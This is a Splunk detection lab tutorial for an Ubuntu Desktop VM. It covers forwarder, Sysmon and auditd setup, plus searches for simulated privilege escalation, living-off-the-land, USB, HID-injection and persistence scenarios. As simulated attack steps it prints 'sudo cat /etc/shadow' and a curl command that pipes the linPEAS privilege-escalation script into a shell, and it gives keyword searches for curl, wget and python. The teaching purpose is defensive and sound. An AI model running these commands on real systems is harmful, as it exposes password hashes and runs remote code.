# Ubuntu Desktop
Prepare a Ubuntu Deskop system (I spun up another VM running Ubuntu Desktop 24.04 LTS), as we practice configuring things and then work on some common use cases.

We will be using the Splunk "agent" called the Universal Forwarder (UF)
- harvests local logs and forward them to the Splunk indexer running on the server
- configure UF to pick up more logs so we can practice looking for cyber attacks

NOTE You will need your splunk.com account again to download Splunk plugins and the UF installer

## Configuring Splunk Server
### Install the Splunk Add-On for Unix and Linux
1. Log in to Splunk web UI
2. Go to the home screen
3. Left-hand sidebar, click **Find more apps**
4. Search for "Splunk Add-on for Unix and Linux"
5. Click **Install**
6. Enter your <ins>splunk.com</ins> username and password and click **Agree and Install**
7. Restart Splunk
    - **Settings** > **Server Controls** > **Restart Splunk**
    - or command line `sudo /opt/splunk/bin/splunk restart`

### Install the Splunk Add-On for Sysmon for Linux
This application is currently Archived.

See links:
- https://docs.splunk.com/Documentation/AddOns/released/NixSysmon
- https://docs.splunk.com/Documentation/AddOns/released/Overview/Singleserverinstall

1. Log in to splunk.com and vist https://docs.splunk.com/Documentation/AddOns/released/NixSysmon
2. Follow the link to download the file, similar to splunk-add-on-for-sysmon-for-linux_100.tgz
3. Log in to your Splunk server and go to the home screen
4. On the left, next to "Find more apps", click **Manage**
5. Restart Splunk
    - **Settings** > **Server Controls** > **Restart Splunk**
    - or command line `sudo /opt/splunk/bin/splunk restart`

## Configure Ubuntu Deskop
Set up a Ubuntu Desktop 24.04 LTS test machine

Be default the UFW firewall is disabled/inactive. If you enabled it, you will need to allow TCP/9997.
- `sudo ufw allow 9997/tcp`
- `sudo ufw status`
     
### Install UF for Unix
1. Download the .deb file
    - https://splunk.com/en_us/download/universal-forwarder.html
    - You need to log in to splunk.com
    - Linux tab > 64-bit ( 6.x+ kernel, etc.) **.deb** > Download Now
        - Or copy the wget link and paste into a command line
2. Install the package named similar to `splunkforwarder-10.0.2-xxxxxx-linux-amd64.deb`
    - `sudo dpkg -i splunkforwarder-xxxx.deb`
    - `sudo /opt/splunkforwarder/bin/splunk enable boot-start`
    - `sudo /opt/splunkforwarder/bin/splunk start --accept-license`
        - Create `admin`/`Splunklab123!` credential, used later for UF changes
3. Connect Splunk indexer
    - `sudo /opt/splunkforwarder/bin/splunk add forward-server <YOUR_SPLUNK_IP>:9997`
        - enter the `admin`/`Splunklab123!` credentials when prompted
    - `sudo /opt/splunkforwarder/bin/splunk list forward-server`
4. Configure what logs to collect
    - Start with authentication logs and system logs
        - `sudo /opt/splunkforwarder/bin/splunk add monitor /var/log/auth.log`
        - `sudo /opt/splunkforwarder/bin/splunk add monitor /var/log/syslog`
5. Confirming logs arrive
    - Create test logs on the Ubuntu desktop:
      - `logger hello splunk`
      - `sudo echo "hello splunk"`
    - Log in to the Splunk Web UI
    - `| metadata type=hosts`
      - If your Ubuntu host name shows up, it is working!
    - `index=_internal host=<ubuntu-hostname>` (usually all lowercase in Splunk)
    - `index=main (sourcetype="syslog" OR sourcetype="auth")`
    - `index=main sourcetype="auth"`
~~~
index=main host="ubuntu-desktop-lan" sourcetype="auth"
| table _time, source, _raw
| sort - _time
~~~

### Test "Privilege Escalation" Scenario
On Ubuntu, `sudo` is the key the kingdom. Any user will use `sudo` for updates, but an attacker will use it to disable security or steal data.

In this example, an attacker is trying to dump the password hashes:
- `sudo cat /etc/shadow`
Splunk search for sudo activity
- `index=main host="ubuntu-desktop-lan" source="/var/log/auth.log" "sudo" "COMMAND="`
~~~
index=main sourcetype="auth" "sudo" "COMMAND="
| rex field=_raw "sudo:\s+(?<user>\S+) : TTY"
| rex field=_raw "COMMAND=(?<command>.*)"
| where isnotnull(command)
| table _time, user, command
~~~


### Test "Living Off the Land" Scenario
On Ubuntu, attackers will use common "dangerous" tools like `curl`, `wget`, `python`, or `netcat`/`nc`. On Linux desktop, `curl` isn't installed by default, so add it.
- `sudo apt install -y curl`

We are going to simulate downloading the second state malicious payload by running the [PEASS-ng](https://github.com/peass-ng/PEASS-ng/) toolkit.
- `curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh`

NOTE that no files are created, the script/tool is piped directly to a shell.

NOTE Read the output best you can to understand what kind of information this gives the attack to planned their next steam and escalate their privileges.

Detecting use of "dangerous" tools and "pipe-to-shell" in Splunk
- Linux doesn't log shell commands. The shell is private, and the commands only get written to ~/.bash_history when the logs out. The standard logs never see them.
  - Note only the installation of curl is logged: `index=main "curl"`
- **Auditd** is the naive Linux way to track this
- **Sysmon** is also available for Linux (we used this in the Windows Labs)

#### Sysmon for Linux
1.  Register the Microsoft repository key
    - `curl -sSL https://packages.microsoft.com/keys/microsoft.asc | sudo gpg --dearmor -o /usr/share/keyrings/microsoft-archive-keyring.gpg`
    - `echo "deb [arch=amd64,arm64,armhf signed-by=/usr/share/keyrings/microsoft-archive-keyring.gpg] https://packages.microsoft.com/ubuntu/24.04/prod noble main" | sudo tee /etc/apt/sources.list.d/microsoft-prod.list`
2. Update and Install
    - `sudo apt update && sudo apt install sysmonforlinux -y`
3. `sudo systemctl status sysmon`
4. Create file [sysmon-config.xml](sysmon-config.xml)
5. Configure on Ubuntu Desktop
    - `sudo sysmon -accepteula -i sysmon-config.xml`
    - `sudo vi /opt/splunkforwarder/etc/system/local/inputs.conf`
        - New file
            - `[journald://sysmon]`
            - `index = main`
            - `sourcetype = sysmon:linux`
6. Configure on Splunk server
    - `sudo vi /opt/splunk/etc/system/local/props.conf`
        - New file
            - `[sysmon:linux]`
            - `SHOULD_LINEMERGE = false`
            - `LINE_BREAKER = ([\r\n]+)\<Event`
            - `TRUNCATE = 0`
            - `REPORT-sysmon_xml = sysmon_data_extraction`
        - `sudo chown splunk:splunk props.conf`
        - If the REPORT line isn't working,
            - `REPORT-manual = sysmon_data_extraction`
    - `sudo vi /opt/splunk/etc/system/local/transforms.conf`
        - New file
            - `[sysmon_data_extraction]`
            - `REGEX = <Data Name="(?P<key>[^"]+)">(?P<value>[^<]*)`
            - `FORMAT = $1::$2
        - `sudo chown splunk:splunk transforms.conf`
    - `sudo /opt/splunk/bin/splunk restart`
6. In the Splunk Web UI:
    - Go to **Settings** > **Source types**
    - Click **New Source Type**
    - Name: **sysmon_linux**
    - Indexed Extractions: xml
    - Save
7. Run the command
    - `curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh`
8. Search Splunk
    - Find commands run (processes created)
~~~
index=main sourcetype="sysmon:linux" | table _time, User, process, process_path
~~~
    - Visualize timeline
        - `index=main sourcetype="sysmon:linux" EventID=1 | timechart span=1m count`
        - Click Visualization (switch to Line Chart)
        - Look for the exact second where the graph goes from a flat line to a huge spike
    - Narrow the timeframe
        - `index=main sourcetype="sysmon:linux" EventID=1`
        - Note you can view the events with a timeline
        - Drag a box around the spike in events
        - Click Zoom to Selection
        - Repeat if you need to zoom in more
    - For the left bar Interesting Fields examine
        - ParentImage
            - "-" is the normal user shell activity
            - "/usr/bin/bash" is the default user shell on Ubuntu
            - "/usr/bin/dash" is what Ubuntu uses when you pipe to sh ("| sh")
            - ParentProcessId, where the most active one happens to be "/usr/bin/dash
        - ParentUser
    - `index=main sourcetype="sysmon:linux" EventID=1 ParentImage="/usr/bin/bash"`
~~~
index=main sourcetype="sysmon:linux" EventID=1 ParentImage="/usr/bin/bash"
| sort 0 _time | table _time, Computer, User, ParentImage, process, CommandLine
~~~

    - Look through the logs and locate the curl command that downloaded and ran the script
    
~~~
index=main sourcetype="sysmon:linux" | sort 0 _time | table _time, ParentImage, process, CommandLine
~~~
    
    - You can now search for all EventID=1 events on that computer starting from that exact time to see all the actions taken on the computer       
    - IMPORTANT look at the User! If it changes from the local user to another user or **root** you have a privilege escalation!
        - add this to the end of your query to look for "root": `| search User=root`
        - you will see that not all "root" activity is malicious

TIP if you modify sysmon-config.xml, you can re-apply the updated file:
- sudo sysmon -c sysmon-config.xml

#### Auditd
Auditd was designed for 1990's compliant and in testing was not suited for threat detection.
- `sudo apt install auditd -y`
- `sudo sed -i 's/log_format = ENRICHED/log_format = RAW/g' /etc/audit/auditd.conf`
- `echo "-a exit,always -F arch=b64 -S execve -k command_monitor" | sudo tee -a /etc/audit/rules.d/audit.rules`
- `sudo augenrules --load`
- `sudo systemctl restart auditd`
- `sudo /opt/splunkforwarder/bin/splunk add monitor /var/log/audit/audit.log`

The Result: Now, every time curl or bash runs, it generates a log in /var/log/audit/audit.log. Unfortunately you can't see the rest of the command arguments.

~~~
index=main "command_monitor"
| rex field=_raw "exe=(?P<hex_exe>\S+)"
| eval clean_exe = if(match(hex_exe, "^[0-9a-fA-F\"]+$"), urldecode(replace(replace(hex_exe,"\"",""), "([0-9a-fA-F]{2})", "%\1")), hex_exe)
| table _time, clean_exe, _raw
~~~

~~~
index=main "command_monitor"
| rex field=_raw "exe=(?P<hex_exe>\S+)"
| eval clean_exe = if(match(hex_exe, "^[0-9a-fA-F\"]+$"), urldecode(replace(replace(hex_exe,"\"",""), "([0-9a-fA-F]{2})", "%\1")), hex_exe)
| search clean_exe="*python*" OR clean_exe="*curl*" OR clean_exe="*wget*"
| table _time, clean_exe, _raw
~~~


### Test "USB Flash Drive" Scenario
Sysmon for Linux doesn't have a specific "USB Inserted" EventID. To detect a USB flash drive, we look for the mount process or the systemd services that automatically manage removable media.

On Ubuntu, when you plug in a drive, the system immediately runs mount or udisksd. You can catch this using EventID 1 (Process Creation).

This search looks for removable media and includes CD-ROMs:
~~~
index=main sourcetype="sysmon:linux" EventID=1 | search (process="*mount*" OR CommandLine="*mount*") | search (CommandLine="*/dev/sr*" OR CommandLine="*/dev/sd*" OR CommandLine="*/media*") | search NOT (CommandLine="*snap*" OR CommandLine="*squashfs*") | table _time, User, process, CommandLine
~~~

The Process: Look for /usr/bin/mount. This is the OS physically attaching the drive to the file system.

The Command Line: Look for something like /media/ubuntu/USB_NAME. This tells you the Label of the USB drive that was inserted.

The User: If the drive was auto-mounted by the desktop GUI, the User might be ubuntu. If it was a system-level mount, it might be root.

### Test "Rubber Ducky" Scenario
The user plugs in a USB device that looks like a flash drive but is acutally a USB HID device. HID stands for Human Interface Device. The [Hak5](https://shop.hak5.org/) [Rubber Ducky](https://shop.hak5.org/products/usb-rubber-ducky) and [Bash Bunny](https://shop.hak5.org/products/bash-bunny) are examples of devices that insert malicious commands via the emulated keyboard.

Detecting HID device insertion in the kerel logs:
- `index=main sourcetype="sysmon:linux" | search "usb" AND "hid" | search "input" OR "registered"`
- `index=main sourcetype="sysmon:linux" | search "Manufacturer" OR "Product:" | table _time, _raw`
- `index=main sourcetype="sysmon:linux" | search "idVendor" AND "idProduct" | table _time, _raw`

Here is what USB Device Detection looks like for the Rubber Ducky:
~~~
usb 1-1.2: new full-speed USB device number 3 using xhci_hcd
usb 1-1.2: New USB device found, idVendor=****, idProduct=****
usb 1-1.2: New USB device strings: Mfr=1, Product=2, SerialNumber=0
usb 1-1.2: Product: USB Keyboard
usb 1-1.2: Manufacturer: Hak5
~~~

Here is what HID Driver Attachment looks like for the Rubber Ducky:
~~~
usb 1-1.2: config 1 interface 0 altsetting 0 endpoint 0x81 has an invalid bInterval 0, changing to 10
input: Hak5 USB Keyboard as /devices/pci0000:00/0000:00:14.0/usb1/1-1/1-1.2/1-1.2:1.0/0003:****:****.0001/input/inputX
hid-generic ****:****.0001: input,hidrawX: USB HID v1.11 Keyboard [Hak5 USB Keyboard] on usb-0000:00:14.0-1.2/input0
~~~

### Test "Persistence Backdoor" Scenario
Attackers want to make sure they stay on the system even after a reboot. Adding a scheduled task/execution....

The Action: A script adds a line to /etc/crontab or a file in /etc/cron.d/ that beacons back to a server every hour.

The "Aha!" Moment: Monitor for EventID 11 (FileCreate) targeting the /etc/cron* directories.

The Search: index=main sourcetype="sysmon:linux" EventID=11 TargetFilename="/etc/cron*"

### Test "Browser Credential Theft" Scenario
Browser Credential Theft (Data Exfiltration)
Attackers often target the browser's "Login Data" database to steal saved passwords.

The Action: A process like cp or cat accesses the SQLite database in ~/.config/google-chrome/Default/Login Data.

The "Aha!" Moment: Using EventID 23 (FileDelete) or general process monitoring to see non-browser processes touching the Chrome/Firefox profile folders.

### Test "Malicious Browser Extension" Scenario
Malicious Browser Extension (Living Off the Browser)
A subtle scenario where an extension executes system commands.

The Action: An extension uses a "Native Messaging" host to run a bash script on the desktop.

The "Aha!" Moment: In your EventID 1 results, look for ParentImage pointing to the Google Chrome or Firefox binary, but spawning /usr/bin/python or /usr/bin/bash.

### Test "Shared Memory Secret Sniffing" Scenario
Shared Memory Secret Sniffing (Memory Forensics)
Linux uses /dev/shm for shared memory. Attackers sometimes use this for "fileless" malware.

The Action: A script creates a hidden executable directly in memory (/dev/shm/.hidden_script) to avoid being caught by traditional disk scans.

The "Aha!" Moment: Watch for EventID 11 or EventID 1 where the path starts with /dev/shm or /tmp.

